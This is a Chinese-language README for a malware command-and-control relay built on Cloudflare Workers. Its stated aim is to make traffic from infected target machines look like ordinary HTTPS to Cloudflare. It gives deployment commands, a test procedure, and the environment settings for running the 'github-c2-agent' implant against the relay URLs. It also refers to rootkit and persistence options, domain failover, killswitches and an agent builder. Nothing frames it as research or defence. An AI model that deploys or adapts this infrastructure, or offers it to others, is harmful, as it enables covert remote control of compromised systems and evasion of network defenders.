# Cloudflare Worker 中转渠道

第三条 C2 通道（与 GitHub Issue / Notion 并存）：目标机出站仅见对
Cloudflare anycast IP 的普通 HTTPS（443，SNI 为你的域名），载荷仍为
`<!-- c|r -->` + AES-256-GCM 信封，三端复用既有加密与水位线逻辑。

## 组件

- `worker.js`      Worker 中转服务（fetch + 定时清理）
- `schema.sql`     D1 表结构（agents / comments / kill_flag）
- `wrangler.toml`  部署配置（改 database_id）

## 部署

```bash
npm i -g wrangler && wrangler login
wrangler d1 create c2relay                 # 把返回的 database_id 填进 wrangler.toml
wrangler d1 execute c2relay --remote --file=schema.sql
wrangler secret put C2_AUTH                # 共享密钥（与下方 worker_secret 一致）
wrangler secret put PATH_SECRET            # 随机路径前缀（第二道门，务必修改默认值）
wrangler deploy                            # 得到 https://c2relay.<你的子域>.workers.dev
# 可选：Dashboard → Worker → Settings → Domains & Routes 绑定自定义域名
#        workers.dev 域名保持启用 —— 双域名互备
```

## 部署后第一步：单独调试中转（勿急接线）

```bash
BASE=https://c2relay.x.workers.dev \
PATH_SECRET=<你设的路径前缀> AUTH=<C2_AUTH> \
bash test_relay.sh          # 12 项端点矩阵：鉴权/注册/发现/收发/水位线/kill/双域名
# 已绑自定义域则加 BASE2=https://你的域 再跑一遍
```

全绿后再：Settings 填 Worker URLs+Secret → Builder 编 channel=worker 的 agent →
Vultr 上跑端到端矩阵。

## 运行 agent（env 契约）

```bash
CHANNEL_TYPE=worker \
C2_WORKER_URLS=https://c2relay.x.workers.dev,https://cdn.你的域.com \
C2_WORKER_SECRET=<共享密钥> \
ENCRYPTION_PASSWORD=<加密口令> \
POLL_INTERVAL=15 SKIP_PERSIST=1 SKIP_ROOTKIT=1 RELOCATED=1 \
./github-c2-agent
```

两个 URL 任填 1-2 个：主域连续失败自动切备域并粘滞回探 —— 也支持
"两个 Cloudflare 账号各部署一个 Worker" 的完全互备形态。

## 控制端

Settings 页填 Worker URLs（逗号分隔两个）+ Worker Secret → Save。
发现/轮询/命令下发/killswitch（含 MCP killswitch_deactivate）自动走该渠道。

## 生成端

Builder → Channel 选 ☁️ Worker → 填 Worker URLs / Secret → Build。
（域名与密钥走运行时 env，故不进 accessor 模板；模板漂移检查保持 12 项不变。）

## 额度（免费档）

Workers 10 万请求/天；D1 每天 10 万行写入、500 万行读取。
单 agent 15s 轮询 ≈ 5,760 请求/天 —— 约 15 个 agent 内免费。
